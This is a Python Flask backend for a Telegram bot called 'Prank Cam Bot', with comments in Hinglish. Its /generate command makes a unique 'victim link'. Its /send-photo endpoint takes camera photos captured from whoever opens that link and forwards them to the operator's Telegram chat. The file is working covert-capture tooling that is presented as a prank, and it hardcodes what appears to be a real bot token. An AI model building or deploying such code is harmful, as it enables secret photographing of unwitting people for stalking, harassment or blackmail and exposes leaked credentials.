from flask import Flask, request, jsonify
import requests
import base64
from io import BytesIO
import uuid
import os
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram import Bot as TelegramBot
import asyncio

app = Flask(__name__)

TOKEN = "8759505136:AAGAVvvts52UJcto01hnAJsv8B4U_1y7orU"  # <--- MUST CHANGE
bot = TelegramBot(token=TOKEN)

# Vercel pe deploy hone ke baad yeh URL automatically mil jaayega, jaise https://your-project.vercel.app
# Local test ke liye temporarily "http://127.0.0.1:5000" rakh sakta hai
WEB_APP_BASE_URL = "https://your-prank-app.vercel.app"   # <--- Deploy ke baad change kar dena

# ------------------ TELEGRAM BOT COMMANDS ------------------
@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if update and 'message' in update:
        chat_id = update['message']['chat']['id']
        text = update['message'].get('text', '')

        if text == '/start':
            asyncio.run(bot.send_message(chat_id=chat_id, text="Welcome to Prank Cam Bot 😂\n\nUse /generate to create victim link!"))
        
        elif text == '/generate':
            unique_id = str(uuid.uuid4())[:8]
            link = f"{WEB_APP_BASE_URL}/?chat_id={chat_id}&id={unique_id}"
            
            keyboard = [[InlineKeyboardButton("📸 Copy & Send Link to Victim", url=link)]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            asyncio.run(bot.send_message(
                chat_id=chat_id,
                text=f"🎯 Victim ke liye Unique Link ready!\n\n{link}\n\nIs link ko victim ko bhej do.\nJab wo kholega aur Camera Allow karega to 3 photos yahin aa jaayengi!",
                reply_markup=reply_markup
            ))
    
    return jsonify({"status": "ok"})

# ------------------ PHOTO RECEIVE ENDPOINT (Web App se aayega) ------------------
@app.route('/send-photo', methods=['POST'])
def send_photo():
    try:
        data = request.json
        chat_id = data.get('chat_id')
        photo_base64 = data.get('photo')
        photo_num = data.get('number', 1)

        if not chat_id or not photo_base64:
            return jsonify({"error": "Missing chat_id or photo"}), 400

        # base64 se image banao
        header, img_data = photo_base64.split(',', 1)
        photo_bytes = base64.b64decode(img_data)

        # Telegram pe photo bhej do
        files = {'photo': ('prank_photo.jpg', BytesIO(photo_bytes), 'image/jpeg')}
        response = requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
            data={
                'chat_id': chat_id,
                'caption': f"📸 Capturing Photo {photo_num}/3 ... Prank Successful! 😂\nVictim ne camera allow kiya!"
            },
            files=files
        )

        return jsonify({"status": "photo_sent", "telegram_ok": response.ok})
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ------------------ HOME PAGE (optional, testing ke liye) ------------------
@app.route('/')
def home():
    return """
    <h1>Prank Cam Bot Backend Running! 🔥</h1>
    <p>Web App ko alag se deploy kar aur link generate kar ke test kar.</p>
    """

if __name__ == '__main__':
    # Local testing ke liye
    app.run(port=5000, debug=True)
